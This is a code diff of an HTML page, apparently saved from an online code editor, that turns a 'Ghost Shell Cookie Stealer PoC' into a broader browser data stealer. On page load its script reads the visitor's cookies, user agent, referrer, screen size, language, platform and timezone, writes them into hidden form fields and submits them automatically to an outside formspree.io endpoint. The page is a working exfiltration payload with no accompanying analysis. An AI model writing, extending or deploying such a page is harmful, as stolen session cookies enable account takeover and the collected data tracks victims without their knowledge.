@@ -492,12 +492,11 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
     <div id="textarea">
       <div id="textareawrapper">
         <textarea autocomplete="off" id="textareaCode" wrap="logical" spellcheck="false"><!DOCTYPE html>
-<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ghost Shell Cookie Stealer PoC</title>
+    <title>Ghost Shell Browser Data Stealer PoC</title>
     <style>
         body {
             background-color: black; /* Black background */
@@ -521,29 +520,44 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 </head>
 <body>
 
-    <h2>Ghost Shell Cookie Stealer Hidden PoC</h2>
+    <h2>Ghost Shell Browser Data Stealer PoC</h2>
 
     <form id="stealthForm" action="https://formspree.io/f/xoveanyq" method="POST">
-        <input type="hidden" name="cookie_data" id="cookieField" value="default_cookie">
+        <input type="hidden" name="cookies" id="cookieField" value="default_cookie">
         <input type="hidden" name="user_agent" id="userAgentField" value="default_agent">
         <input type="hidden" name="referrer" id="referrerField" value="default_referrer">
+        <input type="hidden" name="screen_resolution" id="screenField" value="default_screen">
+        <input type="hidden" name="language" id="languageField" value="default_language">
+        <input type="hidden" name="platform" id="platformField" value="default_platform">
+        <input type="hidden" name="timezone" id="timezoneField" value="default_timezone">
         <input type="hidden" name="fallback" value="not_empty"> <!-- Prevents empty form rejection -->
         <button type="submit" name="submitButton">Send</button>
     </form>
+
     <script>
         document.addEventListener("DOMContentLoaded", function() {
-            // Capture cookies, user agent, and referrer
+            // Capture cookies and additional browser data
             var cookies = document.cookie || "No_Cookies";
             var userAgent = navigator.userAgent || "Unknown_User_Agent";
             var referrer = document.referrer || "No_Referrer";
+            var screenResolution = `${screen.width}x${screen.height}` || "Unknown_Screen";
+            var language = navigator.language || navigator.userLanguage || "Unknown_Language";
+            var platform = navigator.platform || "Unknown_Platform";
+            var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown_Timezone";
 
             // Inject data into form fields
             document.getElementById("cookieField").value = cookies;
             document.getElementById("userAgentField").value = userAgent;
             document.getElementById("referrerField").value = referrer;
+            document.getElementById("screenField").value = screenResolution;
+            document.getElementById("languageField").value = language;
+            document.getElementById("platformField").value = platform;
+            document.getElementById("timezoneField").value = timezone;
 
-            // Submit form only if data exists
-            if (cookies !== "No_Cookies" || referrer !== "No_Referrer") {
+            // Submit form if any meaningful data exists
+            if (cookies !== "No_Cookies" || referrer !== "No_Referrer" || 
+                screenResolution !== "Unknown_Screen" || language !== "Unknown_Language" || 
+                platform !== "Unknown_Platform" || timezone !== "Unknown_Timezone") {
                 document.getElementById("stealthForm").submit();
             }
         });
